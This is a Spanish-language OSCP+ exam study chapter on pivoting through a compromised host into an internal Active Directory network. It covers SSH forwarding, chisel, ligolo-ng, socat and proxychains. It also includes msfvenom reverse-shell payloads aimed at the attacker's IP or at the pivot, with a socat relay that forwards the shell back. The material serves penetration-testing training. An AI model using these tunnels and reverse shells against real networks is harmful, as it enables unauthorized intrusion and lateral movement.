# 07 — Pivoting y túneles

## Por qué esto no es opcional

El set de AD son **3 máquinas encadenadas**. Muy probablemente no vas a poder llegar a la
segunda y tercera directamente: vas a tener que **atravesar** un host comprometido para
alcanzar la red interna.

Si no tenés un método de pivoting **probado de antemano**, esto se resuelve mal y con el reloj
corriendo. Es de las peores formas de perder el set.

---

## Aviso crítico sobre Metasploit

> "Metasploit cannot be used for pivoting, because it would thereby be used on more than one
> target." — *OSCP+ Exam Guide*

**Esto significa que las técnicas clásicas de Metasploit — `autoroute`, `socks_proxy`,
`portfwd` — están fuera.** Metasploit no se puede usar para pivoting, punto.

Tampoco sirve el argumento "solo uso el handler": `autoroute` y `socks_proxy` son módulos de
enrutamiento, y enrutar tráfico hacia más de un objetivo es exactamente lo que la regla prohíbe.

**Conclusión**: el pivoting lo hacés con herramientas que **no** sean Metasploit.

---

## Diagnóstico de herramientas en esta máquina

Verificado (ver `../guia/verificado-2026.md`):

| Herramienta | Estado | Nota |
| --- | --- | --- |
| `proxychains4` | **OK** | `/usr/bin/proxychains4` |
| `socat` | **OK** | `/usr/bin/socat` |
| `ssh` | **OK** | Port forwarding nativo |
| `chisel` | **OK** | 1.12.1 — cliente Windows en `~/examen/tools/win/chisel.exe` |
| `ligolo-ng` | **OK** | 0.9.1 — binarios `ligolo-proxy` / `ligolo-agent`; agentes Win/Linux en `~/examen/tools/` |
| `ncat` | **OK** | 7.99 |
| `sshuttle` | FALTA | opcional |

**Ya están instaladas y verificadas** (23-sep-2026). El diagnóstico completo está en
`../guia/verificado-2026.md`.

```bash
sudo apt install -y chisel ligolo-ng ncat   # solo si faltaran
```

---

## Opción 1 — SSH port forwarding (nativo, cero dependencias)

**Si el host comprometido tiene SSH y credenciales, esta es la opción más limpia.** No requiere
subir nada.

### Túnel dinámico (SOCKS proxy) — el más útil

```bash
# Desde tu Kali: crea un SOCKS5 en localhost:1080 que sale por el host pivote
ssh -D 1080 -N -f user@<PIVOTE>

# Configurar proxychains
# /etc/proxychains4.conf → al final:   socks5 127.0.0.1 1080
proxychains4 nxc smb 172.16.0.10 -u user -p pass
proxychains4 evil-winrm -i 172.16.0.10 -u user -p pass
```

> **Limitación real de proxychains**: solo enruta TCP, y muchas herramientas no se comportan
> bien. `nmap` necesita `-sT -Pn` (no SYN scan, no ping):
>
> ```bash
> proxychains4 nmap -sT -Pn -p 445,3389,5985 172.16.0.10
> ```

### Port forwarding local

```bash
# Traer un puerto de la red interna a tu Kali
ssh -L 8080:172.16.0.10:80 user@<PIVOTE>
# Ahora http://localhost:8080 llega a 172.16.0.10:80
```

### Reverse tunnel

```bash
# Desde el pivote hacia tu Kali: expone un puerto del pivote en tu Kali
ssh -R 9001:localhost:9001 user@<TU_IP>
```

---

## Opción 2 — Chisel (recomendado)

Túnel sobre HTTP, un solo binario, no necesita SSH ni nada instalado en el pivote.
**Es la opción más confiable** y por eso la recomiendo instalar.

### Servidor en tu Kali

```bash
chisel server -p 8000 --reverse --socks5
```

### Cliente en la víctima

```bash
# Reverse SOCKS — te trae la red interna a tu Kali
./chisel client <TU_IP>:8000 R:socks
# Levanta un SOCKS5 en 127.0.0.1:1080 de tu Kali
```

```bash
# Y con proxychains
proxychains4 nxc smb 172.16.0.10 -u user -p pass
```

### Forward de puertos puntuales

```bash
chisel server -p 8000 --reverse
./chisel client <TU_IP>:8000 R:3389:172.16.0.11:3389
```

---

## Opción 3 — Ligolo-ng (el más potente)

Crea una **interfaz de red virtual** en tu Kali. La ventaja enorme: no necesitás proxychains —
las herramientas ven la red interna **directamente**, con funcionalidad completa (escaneos,
UDP, todo).

### En tu Kali

```bash
# Interfaz virtual
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Servidor
./agent/proxy -selfcert -laddr 0.0.0.0:11601
```

### En la víctima

```bash
./agent -connect <TU_IP>:11601 -ignore-cert
```

### En la consola del proxy de ligolo

```text
# Seleccionar la sesión
session
# Arrancar el túnel
start
```

### Y en otra terminal de tu Kali

```bash
sudo ip route add 172.16.0.0/24 dev ligolo
# Ahora SÍ: nmap normal, sin proxychains, sin -sT
nmap -sCV 172.16.0.10
```

---

## Opción 4 — Socat (cuando no podés subir nada)

Disponible en esta máquina y en la mayoría de los Linux. Sirve para **un puerto puntual**.

```bash
# En el pivote: reenviar 8080 de tu Kali al 80 de la máquina interna
socat TCP-LISTEN:9000,fork,reuseaddr TCP:172.16.0.10:80
# Y después, en tu Kali, forward local:
ssh -L 8080:localhost:9000 user@<PIVOTE>
```

Combinado con `socat`, también sirve para el **redireccionador de RoguePotato**.

---

## Elegir la herramienta

```text
¿Tenés credenciales SSH en el pivote?
   SÍ → ssh -D 1080 -N -f  + proxychains        [más limpio, cero dependencias]
   NO ↓
¿Podés subir un binario?
   SÍ → chisel (reverse SOCKS)                  [confiable, un solo binario]
        ligolo-ng                               [mejor si vas a escanear mucho]
   NO ↓
socat para puertos puntuales                     [limitado pero sin dependencias]
```

---

## Enrutamiento: lo que proxychains no puede

`proxychains` enruta **solo TCP**. Vas a chocar contra estas paredes:

| Necesidad | ¿proxychains sirve? | Alternativa |
| --- | --- | --- |
| SMB, LDAP, WinRM, HTTP | Sí | |
| Escaneo SYN de nmap | **No** | `nmap -sT -Pn` |
| ICMP (ping) | **No** | No hay. Trabajá sin ping |
| UDP (SNMP, DNS) | **No** | ligolo-ng |
| Kerberos (UDP 88) | Parcial | Forzá TCP, o usá ligolo-ng |
| Responder | **No** | Necesita ligolo-ng o estar en el segmento |

**Si vas a hacer Kerberos o ADCS a través del pivote, ligolo-ng te evita media hora de
pelea.** Es la razón principal para instalarlo.

---

## Pivoting en contexto AD

Cosas que te van a morder al atacar AD a través de un túnel:

### DNS

Los ataques de Kerberos dependen de resolver el nombre del dominio. A través de un túnel,
`/etc/resolv.conf` apunta a tu red, no a la interna.

```bash
# Solución: agregar el DC a /etc/hosts con su nombre completo
echo "172.16.0.10  dc01.dominio.local dc01 dominio.local dominio" | sudo tee -a /etc/hosts
```

Y en las herramientas, pasá el DNS explícito:

```bash
/usr/bin/nxc ldap 172.16.0.10 -u user -p pass -d dominio.local --dns-server 172.16.0.10
certipy-ad find -u user@dominio.local -p pass -dc-ip 172.16.0.10 -ns 172.16.0.10 -vulnerable -stdout
```

### Coerción (PetitPotam, PrinterBug)

Requiere que el DC se conecte **de vuelta a vos**. A través de un SOCKS proxy eso **no funciona**:
la conexión entrante no sabe volver.

Para coerción necesitás:

- **ligolo-ng** (te da presencia real en el segmento), o
- Un **redireccionador** en el pivote (por eso RoguePotato pide `socat`).

Si no tenés ninguna de las dos, **descartá los ataques que dependen de coerción** y buscá
otro camino. Reconocerlo temprano te ahorra horas.

### Reverse shells a través del túnel

Tu reverse shell necesita llegar de vuelta a vos. Con SOCKS:

```bash
# El payload tiene que apuntar a una IP alcanzable DESDE LA VÍCTIMA
# Si el pivote puede alcanzarte, apuntá a tu IP real:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<TU_IP> LPORT=4444 -f exe -o s.exe
```

Si tu Kali **no** es alcanzable desde la red interna (caso frecuente), necesitás un forward
en el pivote:

```bash
# En el pivote: escuchar y reenviar a tu Kali
socat TCP-LISTEN:4444,fork TCP:<TU_IP>:4444
# Y el payload apunta al PIVOTE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP_PIVOTE> LPORT=4444 -f exe -o s.exe
```

---

## Chuleta de diagnóstico

Cuando algo no funciona a través del pivote, revisá en este orden:

1. **¿El servicio está vivo?** Desde el pivote: `curl`/`nc -zv` al destino.
2. **¿El proxy escucha?** `ss -tlnp | grep 1080` en tu Kali.
3. **¿proxychains está configurado?** `grep socks4 /etc/proxychains4.conf` → debe decir
   `socks5 127.0.0.1 1080`.
4. **¿Es TCP?** Si es UDP/ICMP, proxychains no lo va a hacer. Cambiá de método.
5. **¿DNS?** Nombre de dominio → `/etc/hosts`.
6. **¿La herramienta respeta el proxy?** Algunas necesitan config explícita
   (`--proxy`, `-p`), no heredan proxychains.

```bash
# Verificar que el SOCKS responde
curl --socks5 127.0.0.1:1080 http://172.16.0.10/
proxychains4 curl -v http://172.16.0.10/
```

---

## Advertencia de preparación

**No improvises el pivoting el día del examen.** Antes de rendir:

1. Instalá `chisel` y `ligolo-ng`.
2. Levantá dos VMs en tu laboratorio y practicá un túnel de punta a punta.
3. Verificá que `proxychains4 nmap -sT -Pn` funciona contra tu red de prueba.
4. Confirmá que `ligolo-ng` te crea la interfaz y que las rutas quedan bien.

Un pivoting que no probaste es un pivoting que te va a fallar cuando más lo necesites.
